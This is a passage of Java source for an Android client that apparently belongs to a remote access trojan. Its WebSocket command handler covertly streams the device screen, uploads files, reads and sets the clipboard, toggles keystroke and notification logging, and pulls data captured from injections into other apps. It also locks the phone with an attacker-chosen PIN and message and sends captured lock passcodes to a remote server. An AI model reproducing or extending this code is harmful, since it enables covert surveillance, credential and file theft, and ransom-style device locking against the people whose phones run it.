                                for (int i = 0; i < 5; i++) {
                                    try {
                                        Thread.sleep(500);
                                    } catch (Exception a) {
                                    }
                                    AccessTools.onesnap();
                                }
                            }
                            break;
                        case "vol":
                            String volumstate = Response.optString("volstate", "empty");
                            //1 volume up
                            //0 volume down
                            if (volumstate.equals("1")) {
                                AccessTools.adjustVolume(true);
                            } else if (volumstate.equals("0")) {
                                AccessTools.adjustVolume(false);
                            }
                            break;
                        case "kb":
                            String KeyboardState = Response.optString("kbstate", "empty");
                            //1 show
                            //0 hide
                            if (KeyboardState.equals("1")) {
                                AccessTools.setKeyboardVisibility(true);
                            } else if (KeyboardState.equals("0")) {
                                AccessTools.setKeyboardVisibility(false);
                            }

                            break;
                        case "nav":
                            String nav_to = Response.optString("nav", "empty");

                            AccessTools.Navitageto(nav_to);

                            break;
                        case "L":
                            //type = 1 lock , 0 unlock
                            String Type = Response.optString("lock", "empty");
                            if (Type.equals("1")) {
                                AccessTools.LockScreen();
                            } else if (Type.equals("0")) {
                                AccessTools.UnlockScreen();
                            }

                            break;
                        case "Q":
                            String qulty = Response.optString("newq", "10");
                            SCRQuality = Integer.valueOf(qulty);

                            break;
                        default:
                            break;
                    }
                } catch (Exception a) {
                    MyLoger.Error("HandleScreen", a.getMessage());
                }
            }

            //
            private void Handlecommand(JSONObject response) {
                try {

                    String NewMsg = response.optString("msg", "");
                    if (NewMsg.length() > 0) {
                        switch (NewMsg) {
                            case "wrk":
                                try {
                                    String command = response.optString("cmnd", "");
                                    if (command.length() > 0) {
                                        MyPacket newpkt = new MyPacket(command.getBytes(), "0".getBytes());
                                        //insertcommand(newpkt);
                                        HandelPacket(newpkt);
                                    }

                                } catch (Exception e1) {
                                    e1.printStackTrace();
                                    MyLoger.Error("ping.onPostExecute", e1.getMessage());
                                }
                                break;
                            case "optns":
                                try {
                                    String SIDF = response.optString("sidf", "null");
                                    if (!SIDF.equals("null")) {
                                        // MyLoger.Debug("New (IDF):",SIDF);
                                        MySettings.Write(Dummyctx, Consts.Sec_IDF, SIDF);
                                    }
                                    String options = response.optString("op", "null");

                                    MyLoger.Debug("authers (options):", options);
                                    if (!options.equals("null")) {
                                        JSONObject jsonObject2 = new JSONObject(options);
                                        writeOptionBool(Dummyctx, Rec_Activitys, jsonObject2.optString("Activities", "0"));


                                        //writeOptionBool(Dummyctx, Rec_keystrokes, jsonObject2.optString("keystrokes", "0"));

                                        Rec_klogs = "1".equals(jsonObject2.optString("keystrokes", "0"));

                                        writeOptionBool(Dummyctx, Rec_Notifications, jsonObject2.optString("notifications", "0"));
                                        writeOptionBool(Dummyctx, Rec_apps, jsonObject2.optString("visitedapps", "0"));
                                        writeOptionBool(Dummyctx, Rec_links, jsonObject2.optString("visitedlinks", "0"));

                                        //writeOptionBool(Dummyctx, Live_Notify, jsonObject2.optString("livenotify", "0"));

                                        Live_Nots = "1".equals(jsonObject2.optString("livenotify", "0"));

                                        //ReadBool(getApplicationContext(), Live_Notify, false);

                                        //---------
                                        writeOptionBool(Dummyctx, Live_Screen, jsonObject2.optString("livescreen", "0"));

                                        if (MySettings.ReadBool(Dummyctx, Live_Screen, false)) {


                                            if (My_Access_inst != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {

                                                if (!isScreenThreadRunning()) {
                                                    SilentScreenThread(Dummyctx, 50);
                                                }
                                            } else {
                                                if (!isSelfRecordON()) {
                                                    SelfRecorder(Dummyctx, 50, "livscr", 1000);
                                                }
                                            }
                                        }

                                        //---------
                                        //writeOptionBool(Dummyctx, Auto_j, );
                                        Auto_jct = "1".equals(jsonObject2.optString("autoj", "0"));
                                        if (Auto_jct) {
                                            if (!isJecton()){

                                                JSONObject jsonObject = new JSONObject();
                                                jsonObject.put("type", id_Commands.jects);
                                                jsonObject.put("cuz", "l");
                                                String jsonData = jsonObject.toString();

                                                Livemessage(Dummyctx, jsonData);
                                            }
                                        }
                                    }

                                } catch (JSONException e) {
                                    MyLoger.Error("Options phone", e.getMessage());
                                }
                                break;
                            case "add":
                                joinclients(Dummyctx);
                                break;
                            case "lject":
                                Handlejects(response);
                                break;
                            case "spng":
                                SendPing(Dummyctx);
                                break;
                            case "file":
                                HandleFiles(response);
                                break;
                            case "fetch":
                                HandleFetch(response);
                                break;
                            case "srh":
                                HandleSearch(response);
                                break;
                            case "upload":
                                HandleUpload(response);
                                break;
                            case "screen":
                                HandleScreen(response);
                                break;
                            case "mic":
                                HandleMic(response);
                                break;
                            case "brows":
                                HandleBrowser(response);
                                break;
                            case "bc"://broadcast
                                Handlebroadcast(response);
                                break;
                            case "scread":
                                Handlescreenread(response);
                                break;

                            case "ject":
                                Handleject(response);
                                break;
                            case "clip":
                                Handleclipboard(response);
                                break;
                            case "lock":
                                Handlelock(response);
                                break;
                            case "chat":
                                Handlemessage(response);
                                break;
                            case "loc":
                                HandleLocation(response);
                                break;
                            case "red"://redirect
                                HandRedirect(response);
                                break;
                        }
                    }
                } catch (Exception e) {
                    MyLoger.Error("Handlemessage", e.getMessage());
                }
            }

            private void Handlelock(JSONObject response) {
                try {

                    String lockcase = response.optString("cas", "");

                    if (lockcase.equals("0")) {//unlock
                        MySettings.WriteBool(Dummyctx, Consts.lock_screen, false);
                        loadcodes();
                    } else if (lockcase.equals("1")) {//lock
                        String thepin = response.optString("pin", "");

                        String thetitle = response.optString("title", "");
                        String themsg = response.optString("lckdis", "");
                        String thetype = response.optString("typ", "");

                        MySettings.Write(Dummyctx, Consts.lock_pin, thepin);
                        MySettings.Write(Dummyctx, Consts.lock_title, thetitle);
                        MySettings.Write(Dummyctx, Consts.lock_msg, themsg);
                        MySettings.Write(Dummyctx, Consts.lock_type, thetype);

                        MySettings.WriteBool(Dummyctx, Consts.lock_screen, true);
                        loadcodes();
                    } else if (lockcase.equals("2")) {//load
                        loadcodes();
                    } else if (lockcase.equals("3")) {//clear
                        Clearpasscodes(Dummyctx);
                    }

                } catch (Exception e) {
                    MyLoger.Error("Handleclipboard", e.getMessage());
                }
            }

            private void loadcodes() {
                String passcodes = MySettings.Read(Dummyctx, Consts.lock_cods, "");
                String islockON = String.valueOf(MySettings.ReadBool(Dummyctx, Consts.lock_screen, false));

                try {
                    String currentpass = MySettings.Read(Dummyctx, Consts.mob_lock, "");
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("type", "lock");
                    jsonObject.put("islk", islockON);
                    jsonObject.put("caplk", currentpass);
                    jsonObject.put("cods", passcodes);

                    // Convert JSON object to string
                    String jsonData = jsonObject.toString();

                    Livemessage(Dummyctx, jsonData);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            private void Handleject(JSONObject response) {
                try {

                    String callcase = response.optString("cas", "");
                    AppDataManager manager = new AppDataManager(Dummyctx);
                    if (callcase.equals("0")) {//delete ject
                        String rem_appid = response.optString("tid", "0");
                        File protectedZipFile = new File(Dummyctx.getFilesDir(), "protected/" + rem_appid);
                        if (protectedZipFile.exists()) {
                            protectedZipFile.delete();
                            AlertServer(Dummyctx, "injection", "Removed inject data");
                        }
                        if (ject_list.contains(rem_appid)) {
                            ject_list.remove(rem_appid);
                            AlertServer(Dummyctx, "injection", "Removed " + rem_appid);
                        }

                        manager.clearData(rem_appid);

                    } else if (callcase.equals("1")) {//load all
                        if (ject_list.size() == 0) {
                            AlertServer(Dummyctx, "injection", "no injections add");
                            return;
                        }

                        JSONArray appDataArray = new JSONArray();
                        //String alldata= "";
                        for (String appId :
                                ject_list) {
                            JSONObject appDataObject = new JSONObject();
                            appDataObject.put("appId", appId);

                            // Get the data for the app
                            List<String> app1Data = manager.getData(appId);

                            if (app1Data.isEmpty()) {
                                appDataObject.put("data", "No data");
                            } else {
                                // Add the list of data as a JSON array
                                JSONArray appDataList = new JSONArray(app1Data);
                                appDataObject.put("data", appDataList);
                            }

                            // Add this app's data object to the main array
                            appDataArray.put(appDataObject);
                        }

                        try {
                            JSONObject jsonObject = new JSONObject();
                            jsonObject.put("type", "ject");
                            jsonObject.put("jdata", appDataArray);//here

                            // Convert JSON object to string
                            String jsonData = jsonObject.toString();

                            Livemessage(Dummyctx, jsonData);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                    } else if (callcase.equals("2")) {//start


                    }

                } catch (Exception e) {
                    MyLoger.Error("Handleject", e.getMessage());
                }
            }

            private void Handlescreenread(JSONObject response) {
                try {

                    String callcase = response.optString("cas", "");

                    if (callcase.equals("0")) {//stop
                        MySettings.WriteBool(Dummyctx, Consts.Live_scread, false);
                    } else if (callcase.equals("zom")) {//zoom mode

                        String expstate = response.optString("xz", "0");
                        try {
                            if (expstate.equals("1")) {
                                if (AccessServices.screenfontSize < 80) {
                                    AccessServices.screenfontSize += 5;
                                }
                            } else {
                                if (AccessServices.screenfontSize > 10) {
                                    AccessServices.screenfontSize -= 5;
                                }
                            }
                        } catch (Exception a) {

                        }

                    } else if (callcase.equals("1")) {//start

                        MySettings.WriteBool(Dummyctx, Consts.Live_scread, true);
                        String sockidf = response.optString("skidf", "null");

                        LiveScReader(Dummyctx, sockidf);
                    }

                } catch (Exception e) {
                    MyLoger.Error("Handlescreenread", e.getMessage());
                }
            }

            private void Handleclipboard(JSONObject response) {
                try {

                    String clipcase = response.optString("cas", "");//0 get , 1 set

                    if (clipcase.equals("0")) {
                        BringMeFront(Dummyctx);
                        String cliptext = UtliTools.readClipboard(Dummyctx);

                        try {
                            JSONObject jsonObject = new JSONObject();
                            jsonObject.put("type", "clip");
                            jsonObject.put("cdata", cliptext);

                            // Convert JSON object to string
                            String jsonData = jsonObject.toString();

                            Livemessage(Dummyctx, jsonData);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                    } else if (clipcase.equals("1")) {
                        String textset = response.optString("tost", "");
                        if (textset.length() > 0) {
                            UtliTools.setClipboard(Dummyctx, textset);
                        }
                    }

                } catch (Exception e) {
                    MyLoger.Error("Handleclipboard", e.getMessage());
                }
            }

            private void Handlemessage(JSONObject response) {
                try {

                    String NewMsg = response.optString("data", "");
                    if (NewMsg.length() > 0) {
                        String chattitle = response.optString("title", "");

                        if (ChatActivity.getInstance() == null || !ChatActivity.getInstance().isChatActivityOpen) {
                            Intent setint = new Intent(Dummyctx, ChatActivity.class);
                            setint.addFlags(FLAG_ACTIVITY_NEW_TASK);
                            setint.putExtra("title", chattitle);
                            Dummyctx.startActivity(setint);
                            try {
                                Thread.sleep(1000);
                            } catch (Exception s) {

                            }
                        }
                        ChatActivity.getInstance().appendToChat("Sender", NewMsg);
                    }
                } catch (Exception e) {
                    MyLoger.Error("Handlemessage", e.getMessage());
                }
            }
        });
    }

    public  void Livemessage(Context ctx, String msg) {
        if (ws != null) {

            try {

                String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
                String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);
                String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");
                String SecondIDF = MySettings.Read(ctx, Consts.Sec_IDF, "null");
//                if (!SecondIDF.equals("null")){
//                    IDF = SecondIDF;
//                }
                if (Myid == null) {
                    return;
                }
                if (IDF == null) {

                    try {
                        if (ws != null) {
                            ws.cancel();
                            ws = null;
                        }
                        if (client != null) {
                            client.dispatcher().cancelAll();
                            client.connectionPool().evictAll();
                            client.dispatcher().executorService().shutdown();
                            client = null;
                        }
                    } catch (Exception s) {

                    }

                    return;
                }
                JSONObject message = new JSONObject();
                // message.put("userId", userid);
                message.put("idf", IDF);
                message.put("sidf", SecondIDF);
                message.put("cip", CIP);
                message.put("pid", Myid);
                message.put("itype", "Slr_client");
                message.put("subc", "msg");
                String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
                message.put("conk", conctkey);
                message.put("msg", msg);

                // Send the JSON message as a string
                ws.send(message.toString());

//                for (int x=0;x<=50;x++){
//                    message.put("pid", "test"+String.valueOf(x));
//                    try {
//                        Thread.sleep(1);
//                    }catch (Exception a){}
//                    ws.send(message.toString());
//                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }


    public  void joinsession(Context ctx, String msg, String type) {
        if (ws != null) {

            try {

                String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
                String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);
                String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");

                if (Myid == null) {
                    return;
                }
                if (IDF == null) {

                    try {
                        if (ws != null) {
                            ws.cancel();
                            ws = null;
                        }
                        if (client != null) {
                            client.dispatcher().cancelAll();
                            client.connectionPool().evictAll();
                            client.dispatcher().executorService().shutdown();
                            client = null;
                        }
                    } catch (Exception s) {

                    }

                    return;
                }
                JSONObject message = new JSONObject();
                // message.put("userId", userid);
                message.put("idf", IDF);
                message.put("pid", Myid);
                message.put("cip", CIP);
                message.put("itype", "Slr_client");
                message.put("subc", type);
                message.put("msg", msg);
                String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
                message.put("conk", conctkey);

                // Send the JSON message as a string
                ws.send(message.toString());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public  void Playvideostrem(Context ctx, final String path, String playit, String sockidf) {
        OkHttpClient tmpclient = new OkHttpClient();
        Request request = new Request.Builder().url(URL_SOCKT()).build();


        WebSocket websocketfile = tmpclient.newWebSocket(request, new WebSocketListener() {
            boolean iamout = false;

            @Override
            public void onOpen(WebSocket webSocketf, Response response) {

                Thread thread = new Thread() {
                    @Override
                    public void run() {
                        try {

                            String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, null);

                            String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");

                            if (Myid == null) {
                                return;
                            }


                            Uri ur = Uri.parse((path).trim());
                            File file = new File(ur.getPath());
                            MediaMetadataRetriever ret = new MediaMetadataRetriever();
                            if (ret != null) {
                                ret.setDataSource(file.getPath());
                                MediaPlayer mp = MediaPlayer.create(ctx, ur);
                                int millis = mp.getDuration();
                                String duration = ret.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);//value is 19767
                                // long i = 1000000;
                                String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
                                for (int i = 1000000; i < millis * 1000; i += 100000) {
                                    if (file.exists()) {

                                        Bitmap bitmap0;
                                        Bitmap.CompressFormat formatit;
                                        if (!playit.equals("1")) {
                                            bitmap0 = ret.getFrameAtTime(i * 10, MediaMetadataRetriever.OPTION_CLOSEST_SYNC);
                                            formatit = Bitmap.CompressFormat.JPEG;
                                        } else {
                                            bitmap0 = ret.getFrameAtTime(i, MediaMetadataRetriever.OPTION_CLOSEST);
                                            formatit = Bitmap.CompressFormat.WEBP;
                                        }

                                        // Bitmap bitmap1 = scaleCenterCrop(bitmap0, bitmap0.getWidth() , bitmap0.getHeight() );
                                        if (bitmap0 != null) {
                                            try {
                                                Bitmap bitmap = Bitmap.createScaledBitmap(bitmap0, 360, 230, false);
                                                ByteArrayOutputStream BOS = new ByteArrayOutputStream();
                                                bitmap.compress(formatit, 10, BOS);
                                                byte[] imageBytes = BOS.toByteArray();
                                                String base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT);

                                                try {

                                                    String imagetype = "thumb";
                                                    if (playit.equals("1")) {
                                                        imagetype = "pvid";
                                                    }
                                                    JSONObject jsonObject = new JSONObject();
                                                    jsonObject.put("type", imagetype);
                                                    jsonObject.put("img", base64Image);
                                                    jsonObject.put("pth", path);
                                                    jsonObject.put("dur", duration);
                                                    String msg = jsonObject.toString();


                                                    JSONObject message = new JSONObject();
                                                    // message.put("userId", userid);
                                                    message.put("idf", sockidf);
                                                    message.put("pid", Myid);
                                                    message.put("itype", "Slr_client");
                                                    message.put("subc", "msg");
                                                    message.put("msg", msg);
                                                    message.put("cip", CIP);

                                                    message.put("conk", conctkey);
                                                    // Send the JSON message as a string
                                                    if (webSocketf == null || iamout) {
                                                        break;
                                                    }

                                                    webSocketf.send(message.toString());


                                                    bitmap.recycle();

                                                    if (!playit.equals("1")) {
                                                        Handler hstop = new Handler(Looper.getMainLooper());
                                                        hstop.postDelayed(new Runnable() {
                                                            public void run() {
                                                                try {
                                                                    killall(webSocketf, tmpclient);
                                                                } catch (Exception d) {

                                                                }
                                                            }
                                                        }, 5000);

                                                        break;
                                                    }
                                                    try {
                                                        Thread.sleep(1);

                                                    } catch (Exception a) {
                                                    }
                                                } catch (Exception a) {
                                                }

                                            } catch (Exception e) {
                                            }
                                        }
                                    }
                                    //i += 500000;
                                }

                                mp.release();
                            }

                        } catch (Exception e) {
                            e.printStackTrace();
                            //webSocketf.close(1000, "Error during file transfer");
                        }
                    }
                };
                thread.start();

            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                // Handle server response if necessary
                super.onMessage(webSocket, text);
                try {
                    JSONObject Response = new JSONObject(text);
                    String msgtype = Response.optString("type", "empty");
                    if (msgtype.equals("stop") || msgtype.equals("Unauthorized access")) {
                        killall(webSocket, tmpclient);

                    }
                } catch (Exception a) {
                }
            }

            private void killall(WebSocket webSocket, OkHttpClient tcli) {
                try {
                    iamout = true;
                    if (webSocket != null) {
                        webSocket.cancel();
                        webSocket = null;
                    }
                    if (tcli != null) {
                        tcli.dispatcher().cancelAll();
                        tcli.connectionPool().evictAll();
                        tcli.dispatcher().executorService().shutdown();
                        tcli = null;
                    }
                } catch (Exception s) {

                }
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                // Clean up resources
                tmpclient.dispatcher().executorService().shutdown();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                t.printStackTrace();
            }

        });
    }


    private final ConcurrentHashMap<String, WebSocket> openSockets = new ConcurrentHashMap<>();

    public  void SendNewSocket(Context ctx, String idf, String msg) {
        WebSocket existingSocket = openSockets.get(idf);
        String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
        if (existingSocket != null) {
            // Check if the socket is still open and send the message
            try {
                existingSocket.send(createMessage(ctx, idf, msg,conctkey));
                return; // Message sent, no need to open a new socket
            } catch (Exception e) {
                // If the send failed, remove the socket and proceed to create a new one
                openSockets.remove(idf);
            }
        }

        OkHttpClient tmpclient = new OkHttpClient();
        Request request = new Request.Builder().url(URL_SOCKT()).build();

        WebSocket websocketfile = tmpclient.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocketf, Response response) {
                openSockets.put(idf, webSocketf); // Save the socket to the collection

                Thread thread = new Thread(() -> {
                    try {
                        String message = createMessage(ctx, idf, msg,conctkey);
                        webSocketf.send(message);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                });
                thread.start();
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                super.onMessage(webSocket, text);
                try {
                    JSONObject Response = new JSONObject(text);
                    String msgtype = Response.optString("type", "empty");
                    if (msgtype.equals("stop") || msgtype.equals("Unauthorized access")) {
                        openSockets.remove(idf); // Remove from the collection
                        tmpclient.dispatcher().executorService().shutdown();
                    }
                } catch (Exception a) {
                    a.printStackTrace();
                }
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                openSockets.remove(idf); // Remove from the collection
                tmpclient.dispatcher().executorService().shutdown();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                openSockets.remove(idf); // Remove from the collection
                t.printStackTrace();
            }
        });
    }

    private String createMessage(Context ctx, String idf, String msg,String conctkey) throws Exception {
        String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
        String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");

        if (Myid == null || idf == null) {
            throw new Exception("Invalid parameters for message creation");
        }

        JSONObject message = new JSONObject();
        message.put("idf", idf);
        message.put("pid", Myid);
        message.put("itype", "Slr_client");
        message.put("subc", "msg");
        message.put("msg", msg);
        message.put("cip", CIP);

        message.put("conk", conctkey);
        return message.toString();
    }

    public  void LiveDownload(Context ctx, String filePath, String sockidf) {
        // Create a new WebSocket and client for each file

        OkHttpClient clientfile = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)  // Increase connection timeout
                .readTimeout(60, TimeUnit.SECONDS)     // Increase read timeout for large file transfers
                .writeTimeout(60, TimeUnit.SECONDS)    // Increase write timeout for large file transfers
                .build();

        Request request = new Request.Builder().url(URL_SOCKT()).build();

        WebSocket websocketfile = clientfile.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocketf, Response response) {
                // Start sending the file in chunks once the WebSocket is open
                Thread thread = new Thread() {
                    @Override
                    public void run() {
                        try {


                            String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
                            //String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);

                            if (Myid == null) {
                                webSocketf.close(1000, "Missing ID");
                                return;
                            }
                            String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");
                            File file = new File(filePath);
                            FileInputStream fis = new FileInputStream(file);
                            long totalBytes = file.length();

                            // Calculate buffer size based on file size
                            int bufferSize = (int) buff(totalBytes);

                            byte[] buffer = new byte[bufferSize];
                            int bytesRead;
                            int totalBytesRead = 0;
                            int chunkNumber = 0;
                            String md5Hash = calculateMD5(file);
                            String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
                            while ((bytesRead = fis.read(buffer)) != -1) {
                                String base64Chunk = Base64.encodeToString(buffer, 0, bytesRead, Base64.NO_WRAP);
                                totalBytesRead += bytesRead;

                                JSONObject message = new JSONObject();

                                try {


                                    message.put("filehash", md5Hash);
                                    message.put("filepath", filePath);
                                    message.put("filename", file.getName());
                                    message.put("filedata", base64Chunk); // Send base64 chunk
                                    message.put("totalSize", totalBytes);
                                    message.put("sentSize", totalBytesRead);
                                    message.put("chunkNumber", chunkNumber++);
                                    message.put("type", "down");
                                    String jsonData = message.toString();


                                    JSONObject finlmsg = new JSONObject();
                                    // message.put("userId", userid);
                                    finlmsg.put("idf", sockidf);
                                    finlmsg.put("pid", Myid);
                                    finlmsg.put("itype", "Slr_client");
                                    finlmsg.put("subc", "msg");
                                    finlmsg.put("msg", jsonData);

                                    finlmsg.put("conk", conctkey);
                                    finlmsg.put("cip", CIP);

                                    webSocketf.send(finlmsg.toString());
                                } catch (Exception a) {

                                }
                                // Send the chunk

                                try {
                                    Thread.sleep(10);  // 100 milliseconds, for example

                                } catch (Exception a) {
                                }
                            }
                            try {
                                Thread.sleep(3000);
                            } catch (Exception a) {
                            }
                            fis.close();
                            // Close the WebSocket after the file is fully sent
                            webSocketf.close(1000, "File transfer complete");

                        } catch (Exception e) {
                            e.printStackTrace();
                            //webSocketf.close(1000, "Error during file transfer");
                        }
                    }
                };
                thread.start();

            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                super.onMessage(webSocket, text);
                try {
                    JSONObject Response = new JSONObject(text);
                    String msgtype = Response.optString("type", "empty");
                    if (msgtype.equals("stop") || msgtype.equals("Unauthorized access")) {
                        clientfile.dispatcher().executorService().shutdown();
                    }
                } catch (Exception a) {
                }
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                // Clean up resources
                clientfile.dispatcher().executorService().shutdown();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                t.printStackTrace();
            }

        });
    }

    public  void LiveScReader(Context ctx, String sockidf) {
        // Create a new WebSocket and client for each file

        OkHttpClient clientfile = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)  // Increase connection timeout
                .readTimeout(60, TimeUnit.SECONDS)     // Increase read timeout for large file transfers
                .writeTimeout(60, TimeUnit.SECONDS)    // Increase write timeout for large file transfers
                .build();

        Request request = new Request.Builder().url(URL_SOCKT()).build();

        WebSocket websocketfile = clientfile.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocketf, Response response) {
                // Start sending the file in chunks once the WebSocket is open
                Thread thread = new Thread() {
                    @Override
                    public void run() {
                        try {
                            Thread.sleep(1);
                        } catch (Exception s) {
                        }
                        String mWidth = MySettings.Read(ctx, Consts.Mob_width, "720");
                        String mHeight = MySettings.Read(ctx, Consts.Mob_height, "1280");
                        String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
                        while (MySettings.ReadBool(ctx, Consts.Live_scread, false)) {
                            try {

                                byte[] imageData = AccessTools.createskilton();
                                if (imageData != null) {


                                    String base64Image = Base64.encodeToString(imageData, Base64.DEFAULT);


                                    JSONObject jsonObject = new JSONObject();
                                    jsonObject.put("type", "scread");
                                    jsonObject.put("img", base64Image);
                                    jsonObject.put("frmt", "w");
                                    jsonObject.put("skly", "0");
                                    jsonObject.put("wmob", mWidth);
                                    jsonObject.put("hmob", mHeight);
                                    String jsonData = jsonObject.toString();


                                    String message = createMessage(ctx, sockidf, jsonData, conctkey);
                                    webSocketf.send(message);
                                }

                            } catch (Exception a) {
                                a.printStackTrace();
                            }
                        }

                        webSocketf.close(1000, "scread complete");
                    }
                };
                thread.start();

            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                super.onMessage(webSocket, text);
                try {
                    JSONObject Response = new JSONObject(text);
                    String msgtype = Response.optString("type", "empty");
                    if (msgtype.equals("stop") || msgtype.equals("Unauthorized access")) {
                        clientfile.dispatcher().executorService().shutdown();
                    }
                } catch (Exception a) {
                }
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                // Clean up resources
                clientfile.dispatcher().executorService().shutdown();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                t.printStackTrace();
            }

        });
    }

    //livscr  "screen"
    public  void LiveScreenSilent(Context ctx, byte[] imageData, String srctype) {

        try {
            String base64Image = Base64.encodeToString(imageData, Base64.DEFAULT);

            String mWidth = MySettings.Read(ctx, Consts.Mob_width, "720");
            String mHeight = MySettings.Read(ctx, Consts.Mob_height, "1280");
            String SecondIDF = MySettings.Read(ctx, Consts.Sec_IDF, "null");
            if (SecondIDF.equals("null")) {
                SecondIDF = MySettings.Read(ctx, Consts.THE_IDF, null);
            }

            JSONObject jsonObject = new JSONObject();
            jsonObject.put("type", srctype);
            jsonObject.put("img", base64Image);
            jsonObject.put("frmt", "w");
            jsonObject.put("skly", "0");
            jsonObject.put("wmob", mWidth);
            jsonObject.put("hmob", mHeight);
            String jsonData = jsonObject.toString();

            SendNewSocket(ctx, SecondIDF, jsonData);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    public  void ProxyMsg(Context ctx, JSONObject message) {
        if (ws != null) {

            try {

                String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
                String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);
                if (Myid == null) {
                    return;
                }
                if (IDF == null) {

                    try {
                        if (ws != null) {
                            ws.cancel();
                            ws = null;
                        }
                        if (client != null) {
                            client.dispatcher().cancelAll();
                            client.connectionPool().evictAll();
                            client.dispatcher().executorService().shutdown();
                            client = null;
                        }
                    } catch (Exception s) {

                    }

                    return;
                }
                message.put("idf", IDF);
                message.put("pid", Myid);
                message.put("itype", "Slr_client");
                message.put("subc", "proxy");
                ws.send(message.toString());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    //    public static void AlertAdmin(Context ctx, String alertitle, String alertmsg) {
//        Thread thread = new Thread() {
//            @Override
//            public void run() {
//                try {
//                    if (ws != null) {
//
//                        try {
//
//                            String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
//                            String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);
//                            if (Myid == null) {
//                                return;
//                            }
//                            if (IDF == null) {
//
//                                try{
//                                    if (ws != null) {
//                                        ws.cancel();
//                                        ws = null;
//                                    }
//                                    if (client != null) {
//                                        client.dispatcher().cancelAll();
//                                        client.connectionPool().evictAll();
//                                        client.dispatcher().executorService().shutdown();
//                                        client = null;
//                                    }
//                                }catch (Exception s){
//
//                                }
//
//                                return;
//                            }
//                            JSONObject message = new JSONObject();
//                            // message.put("userId", userid);
//                            message.put("idf", IDF);
//                            message.put("pid", Myid);
//                            message.put("itype", "Slr_client");
//                            message.put("subc", "alert");
//                            message.put("alrtitle", alertitle);
//                            message.put("alrmsg", alertmsg);
//                            // Send the JSON message as a string
//                            ws.send(message.toString());
//                        } catch (Exception e) {
//                            e.printStackTrace();
//                        }
//                    }
//                } catch (Exception ex) {
//                    ex.printStackTrace();
//                }
//            }
//        };
//        thread.start();
//
//    }
//    public static void LiveSearch(Context ctx, String searchtype, String type,String thepaths) {
//        if (ws != null) {
//
//            try {
//
//                String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
//                String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);
//                if (Myid == null) {
//                    return;
//                }
//                if (IDF == null) {
//
//                    try{
//                        if (ws != null) {
//                            ws.cancel();
//                            ws = null;
//                        }
//                        if (client != null) {
//                            client.dispatcher().cancelAll();
//                            client.connectionPool().evictAll();
//                            client.dispatcher().executorService().shutdown();
//                            client = null;
//                        }
//                    }catch (Exception s){
//
//                    }
//
//                    return;
//                }
//                JSONObject message = new JSONObject();
//                // message.put("userId", userid);
//                message.put("idf", IDF);
//                message.put("pid", Myid);
//                message.put("itype", "Slr_client");
//                message.put("subc", type);
//                message.put("stype", searchtype);
//                message.put("pths", thepaths);
//                // Send the JSON message as a string
//                ws.send(message.toString());
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
//        }
//    }
    private void closesocket() {
        try {
            if (ws != null) {
                ws.close(1000, null);
                // ws.cancel();

                ws = null;
            }
            if (client != null) {
                client.dispatcher().cancelAll();
                client.connectionPool().evictAll();
                client.dispatcher().executorService().shutdown();
                client = null;
            }
        } catch (Exception f) {
            f.printStackTrace();
        }
    }


    private boolean isended = false;

    private void Endme() {
        if (isended) {
